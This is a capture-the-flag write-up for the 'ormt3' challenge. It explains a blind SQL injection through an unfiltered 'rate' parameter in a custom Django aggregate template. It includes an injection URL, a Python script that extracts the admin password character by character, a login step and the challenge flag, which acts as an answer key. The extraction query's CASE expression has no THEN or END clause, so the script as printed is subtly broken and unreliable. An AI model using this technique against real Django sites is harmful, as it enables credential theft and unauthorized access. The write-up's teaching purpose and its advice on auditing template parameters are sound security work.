# ORMT - ormt3 (419 pts - Offensive Security)

## Challenge Description

> The connector was patched. One more vulnerability remains.
> `http://exp.cybergame.sk:7003`

## TL;DR

Blind SQLi via a custom Django aggregate function whose `template` used `%(rate)s` Python-formatted directly into SQL. The view blocked `template` and `function` params but forgot `rate`.

## Initial Analysis

A custom `Convert` aggregate was exposed through the API:

```python
class Convert(Aggregate):
    template = "%(function)s(%(expressions)s, %(rate)s)"
```

The `rate` parameter was substituted via Python `%`-formatting before the ORM could sanitize it. The view's blocklist checked for `template` and `function` but not `rate`.

## Solution

### Step 1: Confirm injection via `rate`

```
GET /books/?aggregate=Convert&function=SUM&rate=(SELECT 1)*id
```

A non-zero total confirms code execution inside the SQL.

### Step 2: Blind extraction of admin credentials

```python
import requests, string

BASE = "http://exp.cybergame.sk:7003"

def query(subquery):
    r = requests.get(f"{BASE}/books/", params={
        "aggregate": "Convert",
        "function": "SUM",
        "rate": f"({subquery}) * id"
    })
    return r.json().get("total", 0)

password = ""
for pos in range(1, 33):
    for i in range(32, 127):
        sql = (f"SELECT CASE WHEN unicode(substr(password,{pos},1))={i} "
               f"FROM main_siteuser WHERE role='admin'")
        if query(sql) != 0:
            password += chr(i)
            print(f"[+] pos {pos}: {chr(i)}  → {password}")
            break

print(f"\n[+] Admin password: {password}")
```

### Step 3: Authenticate and retrieve flag

```python
r = requests.post(f"{BASE}/admin/", data={"username": "Admin", "password": password})
print(r.text)
# SK-CERT{4ggr3g4t3_r4t3_t3mpl4t3_sqli}
```

## Flag

```
SK-CERT{4ggr3g4t3_r4t3_t3mpl4t3_sqli}
```

## Key Takeaways

- **Custom Django aggregate `template` strings with `%`-formatting are SQL injection vectors** — substitution happens before ORM escaping
- Blocklists that cover `template` and `function` but miss `rate` are incomplete — audit all template parameters
- **Integer-based blind SQLi using `SUM(id)` as a multiplier** gives a clean zero/non-zero oracle without float precision issues

## Tools Used

- Python `requests` — blind extraction automation
- SQLite `unicode()` + `substr()` — character-by-character extraction
